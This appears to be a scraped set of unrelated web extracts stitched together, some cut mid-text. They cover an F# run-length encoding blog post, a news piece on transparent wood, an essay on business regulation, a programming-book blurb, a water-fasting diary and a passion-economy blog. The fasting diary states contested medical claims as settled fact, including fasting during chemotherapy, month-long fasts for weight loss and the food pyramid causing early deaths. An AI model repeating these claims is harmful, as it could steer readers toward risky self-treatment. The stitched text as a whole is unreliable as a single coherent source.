Encoding, so that's what I named the function.</p><!--kg-card-begin: markdown--><pre><code>
let runLengthEncode&lt;'a when 'a:equality&gt; inputSeq =
  let rec rleInnerLoop inputSeq acc =
    if inputSeq|&gt;Seq.isEmpty then acc else
    let itemWereWatching=inputSeq |&gt;Seq.head
    let chunk=inputSeq |&gt; Seq.takeWhile itemWereWatching.Equals
    let chunkLength=chunk|&gt;Seq.length
    let newInputSeq = inputSeq |&gt; Seq.skip chunkLength
    let newItem=seq{itemWereWatching, chunkLength}
    rleInnerLoop newInputSeq newItem |&gt; Seq.append acc
  rleInnerLoop inputSeq Seq.empty
</code></pre>
<!--kg-card-end: markdown--><p>The only type constraint I had was that whatever stream of stuff I'm processing, it has to support equality, or a=b, otherwise how could I remove duplicates? I'm also quite taken back by the size of the code. Now my code was the big honking solution. Yikes!</p><p>Could I shorten it? Well sure, since it's pure FP and written in an idiomatic style, the whole thing could collapse to one line of code. But why do that? All of those labels in there are for my benefit, in case I need to debug. Until I've tested the hell out of it, I need the labels. (Plus the labels and size shouldn't matter to the compiler anyway, if I can collapse it, the compiler should be able to collapse it)</p><p>But something about this feels odd to me, as if it were one of those situations where non-idiomatic code might be better for performance reasons. That's what happens under-the-hood with some F# library functions. For now, though, I'll let the library guys worry about optimization and I'm stay happy with a solved problem. yay me</p><p>Of course I have to write the inverse function, Run Length Decode:</p><!--kg-card-begin: markdown--><pre><code>let runLengthDecode (inputSeq:seq&lt;'a*int&gt;) =
  seq {yield! inputSeq|&gt;Seq.collect(fun x-&gt;Seq.replicate (snd x) (fst x))}
</code></pre>
<!--kg-card-end: markdown--><p>That's a lot shorter and makes me happy. When I see functions like the first one I worry that I've gone far afield of the best solution, perhaps by reinventing the wheel. When I see functions like the second one, I am reassured that this is a common problem. Many others have been here before me. (This goes back to my statement that "I need the labels until I've tested the hell out of it" Other people have done the testing work. Woot!)</p><p>What lessons were learned? Well, I really suck at coding in my head. I knew already but continue to be amazed when it happens with only the simplest problems. One of the major points of <a href="https://leanpub.com/info-ops2">Info-Ops II</a> is that our belief in our understanding of the code, no matter what it is, is much more unfounded than founded. Even with "perfect" code, battle-tested and hardened, the most you can say is that it works, it has no bugs, and you can trust it. You can't say you understand all that's going on. Modern programming if far, far too complex for that ever to be true. </p><p>We're all like that, even non-coders. As much as some of us think we can code in our head, it doesn't work that way, even many times with the most trivial of problems. That doesn't stop us, though. There are people who think they can talk at length about deep issues like foreign policy, all the while maintaining a logical and coherent set of symbols. They're being logical. They're running the code they've created in their head. Other folks, though, are not. (Other folks see this the same way, only with the players reversed) </p><p>This is true in policy discussion for the exact same reasons it's true with coding. There's simply too much depth and nuance in language for it to work like code, and even if it did work like code, we'd think we understood far, far more than we actually do. We lose either way.</p><p>Secondly, test cases don't always save you. Yes, my initial mistake was not having test cases, just doing it in my head, but once I had test cases and started coding it out, the major part of my hang-up was dealing with some kind of IDE/OS/Unicode/UTF-8 crap, not the code itself. Doesn't matter, I still would have taken more than the allotted 25 minutes. I do not get the job.</p><p>But I had fun. That made it worth the effort.</p><p>P.S. For those interested in how this all would collapse into one line, here's a hint:</p><!--kg-card-begin: markdown--><pre><code>let runLengthEncode2&lt;'a when 'a:equality&gt; inputSeq =
  let rec rleInnerLoop inputSeq acc = match inputSeq|&gt;Seq.isEmpty with |true-&gt;acc|false-&gt;rleInnerLoop (inputSeq |&gt; Seq.skip ((inputSeq |&gt; Seq.takeWhile (inputSeq |&gt;Seq.head).Equals)|&gt;Seq.length)) (seq{(inputSeq |&gt;Seq.head), ((inputSeq |&gt; Seq.takeWhile (inputSeq |&gt;Seq.head).Equals)|&gt;Seq.length)}) |&gt; Seq.append acc
  rleInnerLoop inputSeq Seq.empty
</code></pre>

When left in the sun, or under a UV lamp for an hour or so, the peroxide bleached out the brown chromophores but left the lignin intact, so the wood turned white.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/transparent-wood-university-of-maryland.jpg 300w,https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/transparent-wood-university-of-maryland.jpg 460w,https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/transparent-wood-university-of-maryland.jpg 620w,https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-university-of-maryland.jpg 780w,https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/transparent-wood-university-of-maryland.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-university-of-maryland.jpg"></p></div><figcaption>Researchers demonstrated after brushing a coat of hydrogen peroxide on the opaque wood material, and exposing it to one hour of sunlight, it turns transparent.<!-- --> <!-- -->(Qinqin Xia, University of Maryland/Science Advances)</figcaption></figure></span></p>  <p>Next, they infused the wood with a tough transparent epoxy designed for marine use, which filled in the spaces and pores in the wood and then hardened.&nbsp;This made the white wood transparent.</p>  <p>You can see a similar effect by taking that same piece of paper towel, dip half of it in water and place it on a patterned surface.&nbsp;The white paper towel will become translucent with light passing through the water and cellulose fibres without being scattered by refraction.</p>  <p>The epoxy in the wood does an even better job, allowing 90 per cent of visible light to pass through.

The clear wood&nbsp;is lighter than glass, with better insulating properties, which is important because windows are a major source of heat loss in buildings. It also might take less energy to manufacture clear wood because there are no high temperatures involved.</p>  <p>Transparent wood could become an alternative to glass in energy efficient buildings, or perhaps coverings for solar panels in harsh environments. There could be no end of uses.</p>      <p>Many different types of wood, from balsa to oak, can be made transparent, and it doesn't matter if it is cut along the grain or against it. If the transparent wood is made a little thicker, it would be strong enough to become part of the structure of a building, so there could be entire transparent wooden walls.</p>  <p>While this technology has yet to&nbsp; be scaled up to industrial levels, the researchers say it has great potential as a new building material. In fact, they say that theoretically, an entire house could be made transparent. It is not clear why anyone would want to live in a transparent house, but for people who do, it would be OK to throw stones…</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/transparent-wood-qinqin-xia-university-of-maryland.jpg 300w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/transparent-wood-qinqin-xia-university-of-maryland.jpg 460w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/transparent-wood-qinqin-xia-university-of-maryland.jpg 620w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-qinqin-xia-university-of-maryland.jpg 780w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/transparent-wood-qinqin-xia-university-of-maryland.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-qinqin-xia-university-of-maryland.jpg"></p></div><figcaption>A researcher holds up a 10-centimetre long slab of the see-through wood.<!-- --> <!-- -->(Qinqin Xia, University of Maryland/Science Advances)</figcaption></figure></span></p>  <p>Images copyright Xia et al.&nbsp;<a href="https://creativecommons.org/licenses/by-nc/4.0/" rel="license">Creative Commons Attribution-NonCommercial license</a>,&nbsp;</p></span></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Competition among businesses is obviously vital to a functioning market. A business that doesn’t have to compete doesn’t have to offer <em>competitive</em> products, pay, etc. Competition on one hand and regulation on the other form an opposing pair of constraints that channels a business’s pursuit of growth, dominance, profit, and development into benefit for society. I posit that the typical root cause of so-called greedy business practices (such as poverty wages, price gouging, lay-offs, cutting costs via human and animal cruelty, environmental pollution, and so on) is not a moral failing of the chief decision-makers, but rather inadequate regulation.</p><p>Yesterday my wife said to me “Kroger is offering to pay $100 to each employee who gets the COVID vaccine. Funny how they’ll do that, but they won’t give hazard pay for working during the pandemic!”.</p><p>“Well, hazard pay would be a lot more expensive, wouldn’t it?”</p><p>“Yes — $4 per hour in Seattle.” So after one week, this would exceed the one-time $100 bonus for full-time employees. “I know it would be costly, but the work is dangerous right now. The employees deserve it.”</p><p>“I agree,” I said, “but to control costs a company can’t pay a whole lot more than the market rate for whatever type of labour it needs. Outspending the competition for the same thing is bad for business.”.</p><p>“I don’t really care what’s bad for business. Paying workers fairly is the right thing to do. The greed required to put profit before ethics is disgusting.”</p><h2 id="whats-bad-for-business">what’s bad for business</h2><p>So, why don’t businesses generally “do the right thing” even if it’s costly? So what if the competition outcompetes them? Winning isn’t everything, right? Sure, but losing <em>is</em> everything. In a stable market, there’s a kind of competitive equilibrium. An uncompetitive company risks being driven out of the market by competitive companies.</p><p>Couldn’t a company just take some money out of profits to pay better, to make more environmentally friendly choices, or whatever? Well, profit makes a company an attractive investment. A company competes not only for customers, but for investors, too. If one company becomes a less attractive investment than its competitors, investors reallocate their investments for better performance. Sacrificing for the greater good <em>is a sacrifice</em>, and the cost is market share.</p><p>Okay, so why don’t businesses make the sacrifice — give up market share or possibly go out of business — in the service of ethics? Because less market share means less power to do the right thing. Companies that have made such sacrifices don’t dominate the market. “Unethical” companies do. One might be able to do the right thing for a little while, but one’s contribution to society will be short-lived.</p><h2 id="whats-bad-for-consumers-and-workers">what’s bad for consumers and workers</h2><p>Some say consumers should vote with their wallets. It feels good to support small local businesses, to boycott sweatshops, to put your money where your morals are. Unfortunately it’s more costly. What Walmart lacks in charm and scruples it makes up for in discounts.</p><p>Other than wealthy consumers who can afford the luxury of consistent ethical choices in the market, the rest of the consumers are in a bind. It’s a matter of preservation of quality of life (or in the extreme, self-preservation) to seek the best deal we can get. The principal form of competition among consumers is not so much “keeping up with the Joneses” as it is making our dollar go as far as everyone else’s. For each ethical spending decision we make, we have less money overall to work with than someone with a similar income who makes the most economically rational choice. So are we going to pay extra for cruelty-free eggs or for cruelty-free clothes? We can’t do this for everything all at once. If <em>all</em> of our purchases are the ethical option, we can’t afford some things that others can afford. Something has to give, and because we are competing with other wage-earners, the result is downward class mobility, a slow spiral into poverty.</p><h2 id="if-not-individual-choices-then-what">If not individual choices, then what?</h2><p>So businesses and consumers both are in a bind where competition dictates that they make economically rational choices or lose. Efficiency is maximised at great environmental and social cost. Individual choices mean squat because “the invisible hand” of the market punishes certain ethical choices and eventually diminishes the influence of ethical agents such that their agency has little effect.</p><p>But what if everyone did the right thing? A market full of agents voluntarily choosing the right thing is wide open for someone to take advantage.</p><p>Okay, but what if everyone <em>had to do the right thing</em>? Consider the minimum wage. Apart from a few egregious loopholes, businesses in most industries have to abide by it. Does Kroger suffer a competitive loss by paying its employees the minimum wage? No, because all of the other grocers have to do likewise. Something still has to give, but it’s not a consumer’s standard of living or a business’s market share. The money really can come out of profits in this case. If it’s coming out of all grocers' profits, investors can’t very well get out of paying for it by divesting from one grocer (or one industry) to invest in another. Almost the whole economy is equally affected, so investors don’t have much of an alternative to taking the loss and moving on. When everyone is forced to make an ethical choice, competitive standing is no longer at stake in making it.</p><h2 id="the-economy-as-a-game">the economy as a game</h2><p>Imagine a sport very much like football (not American hand-egg) wherein there is no such thing as a foul. It would be a perfectly valid (if unethical) strategy to injure the other team relentlessly until they were unable to mount a competent opposition, and then to score goals unchallenged for the remaining time. (Trust me - as a kid, I tested this strategy in Fifa 98 with fouls turned off.)</p><p>Well, perhaps not unethical if you consider that the risk would be obvious and participation voluntary. Participation in the market is hardly voluntary (apologies to any hunter-gatherers I may offend), though the risks are obvious.</p><p>So how do we achieve the utilitarian outcome of minimising the risk of injury in our sport, given that everyone is entered into this tournament at birth? We could just try to play ethically on an individual basis, or try to shift the general attitudes of many players against violence. But the people who kick shins will end up playing the most matches in this tournament, because their strategy still works. We choose to lose by abstaining from exploitation individually, so we choose to allow the shin-kickers to dominate. We’re in a bind. The “ethical” choice does not fix the systemic problem that causes the bad outcome. With this set of rules, either choice leads to the same bad outcome. Well, obviously we need to reinstate the foul rule! If it’s impossible to win by kicking shins, there ceases to be any competitive advantage in doing so, and we can all benefit from a game with less shin-kicking.</p><p>Choosing ethically in commerce may assuage our guilt, but it does not make the world a better place. Regulations would actually make a difference.</p></div></div>]]>

<p>The Mediocre Programmer? What's that?</p>
<p>The Mediocre Programmer is a book about the journey of becoming a better programmer. But before we can become better programmers we have to pass through being mediocre programmers. Mediocre doesn't mean a bad programmer --- far from it. It means lacking skill. As beginners we start our journey full of fresh ideas of how we'll be great programmers, but as we learn more we realize that the gap between being a beginner and an expert programmer requires us to be mediocre for a time. And that period of mediocrity can be frustrating. As beginning programmers we're given all the encouragement to explore and make mistakes. As we move to the intermediate and mediocre stages of programming that encouragement fades. Instead of encouragement we are faced with expectations, both from ourselves and from others. We start to question our abilities. Why do we have to keep looking things up? Shouldn't we already know this? Why does programming feel like a struggle? Am I ever going to be good at this? </p>
<p>This book is about helping you along on the journey of being a mediocre programmer. Together we'll uncover some of common misconceptions we have about programming, failure, and growth and come to understand that the act of programming and development is something we undertake each day and improve in small ways. It's these small changes that over time transform us from being mediocre programmers into better programmers.</p>
<p>There are plenty of books on how to become a better programmer out there. Books like this tend to have checklists and other advice that the author deems important enough for you to do in order to become a better programmer. They tend to focus on specific improvements like choosing a better editor, writing better test cases, or drinking lots of water. Those books have lots of useful advice, but they read like a laundry list of things that you must do all at once in order to succeed. This book will try not to saddle you with more work (you likely have enough as it is). Rather, we'll discuss what it feels like to be a programmer. We'll talk about the emotions in being a programmer; the feelings of frustration, guilt, anger, and inadequacy. We'll cover the struggles in learning new things and keeping your skills current. We'll talk about those times when you feel like giving up and walking away from computing and whether those feelings come from a place of love or a worry that you're not keeping up.</p>
<p>This book is a personal journey for both of us. It's a memoir of my time as a programmer and my feelings along the way. I've thought many times about giving up and finding a different career path but doing anything other than being a computer programmer scares me even more. Does that mean I'm stuck in a perverse ouroboros of self-pity and self-doubt? Hardly. It means that I need to dig deeper to understand why I chose the path of being a programmer and realize that it took a lot to get here and it's going to take a lot more to get where I want to be. It's a commitment to seeing things as they are now and moving forward from wherever I'm standing.</p>
<p>I hope you'll join me on this journey.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>Day One - Exiting the Pyramid</strong></p><p>On December 17, I stopped eating for seven days. I consumed nothing but water, coffee, and an occasional pinch of salt. I did it to achieve cellular regeneration, spiritual contemplation, and a temporary break in my furious, constant consumption of every calorie within ten feet.</p><p>I was following in the footsteps of a man who tried to starve himself to death. In 1887, Dr. Henry S. Tanner stopped eating, having apparently decided that he deserved an agonizing demise after failures in marriage and business. As the first few famished days passed, he wondered when the sweet release of death would cease its tardiness. But, by the tenth day, he didn’t feel hungry anymore—in fact, felt vigorous and healthy. He saw no reason to stop fasting, and, in the end, fasted for a month, before repeating the feat repeatedly in the presence of puzzled doctors.</p><p>However, though Dr. Tanner did much to popularize fasting in the modern era, he wasn’t my immediate inspiration. I’d been influenced to try water fasting by friends in the tech sector, where fasting has become something of a trend. Not everyone is happy about this. The Harper’s Bazaar article “<a href="https://www.harpersbazaar.com/beauty/diet-fitness/a28577713/silicon-valley-fasting/">Inside Silicon Valley’s Dangerous New Obsession with Fasting</a>,” for example, claims that fasting is merely disordered eating rebranded and that its tech sector purveyors are being unjustly lauded for habits that are condemned in teen girls. There’s also <a href="https://www.theguardian.com/lifeandstyle/2019/feb/21/extreme-fasting-how-silicon-valley-is-rebranding-eating-disorders">this one</a>, and <a href="https://www.theatlantic.com/health/archive/2019/01/silicon-valley-extreme-diets-fasting/581566/">this one</a>, and many other works of literature penned by the nutrition and psychology experts of progressive Twitter.</p><p>They’re all mostly wrong. They’re also probably somewhat culturally motivated; it’s hard to imagine any of these publications putting out something called The Dark Side of Ramadan: Inside the Muslim World’s Dangerous Obsession with Fasting.</p><p>But I don’t blame them for being wrong. Their opinions are to be expected. They’ve been educated by a culture that teaches you the gospel of three meals a day, every day—that constant eating is a necessity for happiness. From birth, they’ve been pumped full of propaganda prepared by agribusiness and government, including conceptual ideas like the Food Pyramid, that compellingly geometric menu that has dug many an early grave. If I told them, or, really, most anyone off the street that I wasn’t going to eat for seven days, they’d probably wonder if I were committing suicide.</p><p>But fasting for surprisingly long periods of time <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6314618/">doesn't actually seem dangerous</a>, for most. In a sense, this finding is obvious; if human beings weren’t able to use our fat stores to survive, we wouldn’t have made it out of the ancestral environment, where occasional scarcity was simply a given.</p><p>However, fasting <em>is</em> hazardous, in a way. It punches this weird food-shaped hole in consensus reality. Doing it can change the way you think about, at the very least, food, disease, and the progress of science—which is to say, a big chunk of human life.</p><p>Oh, and, at times, it does totally suck. The first day is tricky. Your body is trained by your normal habits, developing hunger pangs in response to the release of a hormone called ghrelin. When you just skip all of that day’s meals, the ghrelin assault is uncomfortable. But then you sit through it, and your hunger pangs just… go away, leaving you, mysteriously, alive.</p><p><strong>Day Two - Big Nothing</strong></p><p>Sometimes, I wish there were a Big Nothing lobby—some sort of agency devoted to studying what would happen if we did less. For example, let’s say the government became fixated on some problem with social welfare. Is there anyone to study what would happen if we did nothing? Would it just get better on its own? Similarly, what would happen if, in response to population-level health issues, instead of taking supplements or treatments, we just ate nothing for an interval?</p><p>Unfortunately, profit motives rule out this potential world. There is no Nothing Lobby. Which is a shame, because if Pfizer or Merck stumbled upon a drug that could do half of what fasting appears to, their entire R&amp;D apartments would be frothing at the mouth and gripping their calipers tightly.&nbsp;</p><p>Though it’s touted as a weight loss intervention, fasting’s health effects go way beyond that. When you read the fasting literature, you have all these moments of, like, <em>what, really? </em>For example, if you come down with cancer, you might want to fast, because <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3048045/">fasting appears to protect the body during chemotherapy, allowing higher doses of radiation to be administered with fewer side effects.</a> On the other hand, maybe you should’ve fasted earlier: studies in mice suggest that fasting <a href="https://osher.ucsf.edu/patient-care/integrative-medicine-resources/cancer-and-nutrition/faq/cancer-and-fasting-calorie-restriction">might be effective in slowing or preventing tumor growth</a>. If you’re just not interested in getting sick at all, you should know that <a href="http://www.cell.com/cell-stem-cell/abstract/S1934-5909(14)00151-9">fasting appears to promote the generation of new white blood cells, thus potentially reinvigorating the immune system</a>. It could also keep you sharp, and by that I mean keep you sharp when you’re 80 years old. <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3106288/">Fasting appears to promote neuronal health, potentially making it a defense against neurodegenerative diseases</a>.</p><p>But, if weight loss is what you’re looking for, supervised fasting appears to be strikingly effective. For example, in 1965, a 456lb man named Angus Barbieri went without eating for a year with no apparent negative consequences, went down to around 180, and kept the weight off for his whole life. And, while this result is uncommon in degree, a brief peak at <a href="http://reddit.com/r/fasting">reddit.com/r/fasting</a> reveals that it’s not unusual in kind.</p><p>We maybe understand why this happens. It seems to be down to autophagy—literally, self-ingestion. Your body constantly recycles old material, but, when you’re fasting, that process is dramatically accelerated. Old cells are broken down. Excess fat is turned into ketone bodies so the brain can continue operating. (Many who lose weight during fasting are surprised to find that they don’t have loose skin because their bodies literally ate it.) After all of the old stuff is recycled, the hypothesis goes, your body functions better.</p><p>But, overall, we’re still ignorant of the mechanisms of water fasting, despite the fact that it’s been advocated for thousands of years—Pythagoras required it of his students, finding that it promoted lucidity and focus. We don’t know what the ideal fasting protocol is. We don’t exactly understand its effects on longevity. It’s possible that repeat fasts in a short period of time could be damaging, specifically to the kidneys—where exactly are the healthy limits? We don’t know.</p><p>Several luminaries of the fasting scene, which is a thing that exists, have figured out how to make money off Nothing. One prominent advocate of no food, Dr. Jason Fung, sells highly readable books on fasting and helps run <a href="http://thefastingmethod.com/">a clinic</a> that coaches people through the fasting lifestyle. Another, Dr. Valter Longo, also sells books, as well as <a href="https://prolonfast.com/">ready-made meals</a> which are low-calorie enough to help fasters maintain a fasting state, but nutritive enough to make the process more tolerable.</p><p>This is all great, but, for the time being, the Nothing Lobby will be eclipsed by the mountains of cash involved in soybean oil, corn syrup, dietary supplements, and bariatric surgeries. And so, for the foreseeable future, fasting may remain poorly-explained and under-promoted, a personal rebellion against the entrenched interests undermining our health.</p><p>Perhaps this should make us furious. I know a fair number of fat people who want to lose weight. They’re given diets that don’t work, supplements that don’t work, and then shamed, which also doesn’t work. But, as it turns out, they might not need any of that. With medical supervision, they could probably solve the problem by not eating for a month or two. It could be a really shitty month or two—but better than struggling for decades, if losing weight is what you want to do. But if they read Harper’s Bazaar, or other maintainers of the dietary Overton Window, they might be dissuaded from even investigating this possibility.</p><p>On day two, fasting is doing weird things to me. Usually, I’m hot all over, but, without calories, my extremities go through thermal alternation—my nose is cold, then hot again. My breath smells great, then awful. At random moments, I’m seized by waves of incredible energy, thoughts of conquest, and the lust for food. At other moments, I lust for nothing and dwell in profound neutrality. I’m more diurnal; whereas I normally tend towards nocturnal activity, I wake with the sun, and my energy plunges the moment it’s dark.</p><p><strong>Day Three - First Principles</strong></p><p>Perhaps one reason that fasting has become popular in Silicon Valley is that it’s an applied crash course in First Principles Thinking. This term has only become a tired cliche in tech circles because it’s a principle that’s served so effectively in the past. The best (and worst) technological innovations have come from asking questions so basic only a curious child or a frenzied entrepreneur would think to ask them, and the process continues today. We don’t live on Mars. Why? We have to drive our cars. Why? We should eat a shit-ton of food every day, without interruption. Why?</p><p>The reason is not immediately apparent. On the third day of my fast, I wake up feeling fine, if still not totally normal. There is this basic knowledge that my bowels are empty. My interior feels strikingly vacant. But, generally, my physical condition is less notable than it was the day before.</p><p>What’s more notable is how surreal it all is. Our days are broken up by meals and punctuated by snacks. Once you take that away, what’s left?&nbsp;</p><p>Great expanses of time. The day just goes on and on and on. In that ocean of minutes, I’m unusually productive. Uninterrupted by the 100,000 snack breaks I usually take in a day, I double my usual daily writing output. Moreover, I’m weirdly focused. The energy that would usually go into digesting fistfuls of random stuff from the fridge is being directed into my laptop.&nbsp;</p><p>There’s a change in mood, too. Most emotion drops away, positive and negative. I’m not interested in listening to fun …</p></div></div>

Well, I spent the next year struggling to reconcile this view with my startup at the time, which was focused on building a passion economy solution for indie developers. And while I am very proud of everything I built with <a target="_blank" rel="noopener noreferrer" href="https://saasify.sh/">Saasify</a>, the platform itself hit some <a href="https://transitivebullsh.it/saasify-vc-feedback">major roadblocks</a>. I had my founder blinders on (which can be both good and bad depending on the circumstances) and felt weighed down by the sunk costs I'd already put into bootstrapping Saasify.</p><p>I needed a change of pace. To reflect. To <a href="https://transitivebullsh.it/saasify-key-takeaways">revisit my assumptions</a> and explore what got me excited about this space in the first place.</p><h3 data-id="9858840eb22546f8997ea1174cb393f2"><a href="#9858840eb22546f8997ea1174cb393f2" title="And that, folks, brings me to today"><svg viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><span>And that, folks, brings me to today</span></h3><p>The idea of moving towards a more independent <em>and</em> fulfilling future of work just aligns so well with my values that I haven't been able to stop thinking about it.</p><p>I've spent the past few months voraciously researching, networking, and thinking about the passion economy. I think this is a very important step in the creative process for founders to develop their own deep, holistic understanding of a space before diving into building products and solutions (a mistake I've fallen prey to in the past).</p><p>And I'm absolutely loving it.</p><p>Regardless of where this journey takes me, I know that I'm thoroughly enjoying the ride. I believe that as long as I control my own destiny and am passionate about the space / journey / people, then great things are bound to happen along the way.</p><p>And this is a large part of why the passion economy resonates with me on such a deep and personal level.</p><h3 data-id="01566e9d19ec4c9ab85842fff9e07baf"><a href="#01566e9d19ec4c9ab85842fff9e07baf" title="Open Source Sustainability"><svg viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><span>Open Source Sustainability</span></h3><div><p>After <a target="_blank" rel="noopener noreferrer" href="https://github.com/transitive-bullshit">nearly 20 years of contributing to open source</a>, I started this journey originally focused on the problem of open source sustainability.</p></div><p>For many software developers, open source is like the wild west. It represents a completely open territory to explore and paint my ideas upon with no rules or regulations. This has led to some <a target="_blank" rel="noopener noreferrer" href="https://coss.media/">unbelievably successful commercial open source products</a> being built that would've otherwise been very difficult to bring to market in a more traditional, closed source world. It's also led to an amazing amount of long-tail value creation and experimentation in the form of smaller OSS projects that have found insane amounts of adoption around the world.</p><p>I think it's safe to say that open source software has had profound effects on the world, but as with many passion projects, the key difficulty lies in making your passion sustainable. When you start off working on a project, it's almost always out of intrinsic motivation; that is to say, it's because you're excited about something and want to scratch your own itch. As your project(s) grow in popularity and usage over time, you inevitably get more and more support requests and people complaining about bugs or missing features. What started as a purely intrinsic passion project has now become a burden, and the only real way to reconcile this problem is to introduce extrinsic motivation (usually in the form of money or followers) that will help you sustain your interest in growing a community around your work.</p><p>There are tens of thousands of these talented indie devs out there who are passionate about open source. And more generally, there are millions of talented creators out there who are passionate about their own creative outlets, whether they be music, videos, teaching, writing, art, comedy, and so much more.</p><h3 data-id="72ec651bcfb54da9829c85fc7f70474f"><a href="#72ec651bcfb54da9829c85fc7f70474f" title="Human passion is universal"><svg viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><span>Human passion is universal</span></h3><p>This brings me back to the passion economy and its cool cousin, the creator economy.</p><p>I fundamentally believe in the boundless potential of humanity. I know that sounds a little idealistic and bullshit-y, but you're literally reading a blog called Transitive Bullshit...</p><p>One thing that I find so much beauty in is all of the different ways that human creativity and passion manifest themselves.</p><p>No matter where you are in the world..</p><p>No matter what your background is..</p><p>No matter what your motivations are..</p><p>No matter what your creative outlets are..</p><p>No matter who you are..</p><p>The internet and platforms built on the internet unlock so much hidden opportunity for you.</p><p>Human passion is truly universal, and the internet is the ultimate tool to unlock the power of human creativity on a scale that is hard to comprehend. In this respect, I believe that we're still in the very early stages of discovering all of the second &amp; third order effects that the internet will have on humanity. I also love thinking about <a target="_blank" rel="noopener noreferrer" href="https://waitbutwhy.com/2015/01/artificial-intelligence-revolution-1.html">humanity as a species that is experiencing an unprecedented rate of exponential evolution</a> and how fundamental forces like the internet, AI, and human passion are driving this evolution forward. It's an exciting time to be alive.</p><p>And these days, there are just so many inspirational stories out there of people striving to better themselves and help their audiences in unique, authentic, and creative ways.</p><p>Human passion and creativity are truly universal, and we're seeing a long-term change in the way people view their passions and creative outlets versus traditional work.</p><figure><div><p><img src="data:image/webp;base64,UklGRlQAAABXRUJQVlA4IEgAAAAQAgCdASoQAA8ABUB8JbACsAERHzma9luAAP7v0t51jxw+/73aT08qIIRPHhVPfeRNAwJmGw5TOmQU0dwRAnPsxOGEaUzsAAA=" alt="Ikigai: The Japanese Secret to a Long and Happy Life Might Just Help You Live a More Fulfilling Life" width="1124" height="1063" decoding="async"><img src="https://ssfy.io/https%3A%2F%2Fwww.notion.so%2Fimage%2Fhttps%253A%252F%252Fs3-us-west-2.amazonaws.com%252Fsecure.notion-static.com%252Ff89a085d-937e-49bd-9aac-a8a4fcb10f40%252FUntitled.png%3Ftable%3Dblock%26id%3D95d34e25-7272-433e-8960-b302309e5a07%26cache%3Dv2" alt="Ikigai: The Japanese Secret to a Long and Happy Life Might Just Help You Live a More Fulfilling Life" width="1124" height="1063" decoding="async" loading="lazy"></p></div><figcaption><a target="_blank" rel="noopener noreferrer" href="https://medium.com/thrive-global/ikigai-the-japanese-secret-to-a-long-and-happy-life-might-just-help-you-live-a-more-fulfilling-9871d01992b7">Ikigai: The Japanese Secret to a Long and Happy Life Might Just Help You Live a More Fulfilling Life</a></figcaption></figure><h3 data-id="68733797765f454d9ddcc2abaf2a6658"><a href="#68733797765f454d9ddcc2abaf2a6658" title="Passion First, Economy Second"><svg viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 